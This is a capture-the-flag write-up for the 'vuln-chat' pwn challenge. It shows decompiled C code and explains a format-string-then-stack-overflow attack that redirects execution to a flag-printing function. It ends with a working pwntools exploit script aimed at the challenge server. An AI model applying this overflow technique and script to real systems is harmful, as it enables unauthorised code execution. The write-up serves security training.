#Writeup Of AceBear Team

First, use IDA pro to view source code i have:
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+3h] [ebp-2Dh]
  char v5; // [esp+17h] [ebp-19h]
  int v6; // [esp+2Bh] [ebp-5h]
  char v7; // [esp+2Fh] [ebp-1h]

  setvbuf(stdout, 0, 2, 0x14u);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  v6 = 's03%';
  v7 = 0;
  __isoc99_scanf(&v6, &v5);
  printf("Welcome %s!\n", &v5);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ", &v5);
  __isoc99_scanf(&v6, &v4);
  puts("djinn: Sorry. That's not good enough");
  fflush(stdout);
  return 0;
}
```
```C
int printFlag()
{
  system("/bin/cat ./flag.txt");
  return puts("Use it wisely");
}
```
When i input username, i can overwrite value of `v6`.
In this case i overwrite value of `v6` to `%s`.
In next step i can overflow stack and overwrite return address to address of `printFlag()`.

```py
from pwn import *
from time import *
printflag = 0x0804856B

r = remote('vulnchat.tuctf.com', 4141)
# r = process('./vuln-chat')
# gdb.attach(r ,)
r.recvuntil('Enter your username: ')
r.sendline('a'*20+'%s\x00')
sleep(1)
r.sendline('a'*0x2d+p32(printflag)*2)
r.interactive()
```
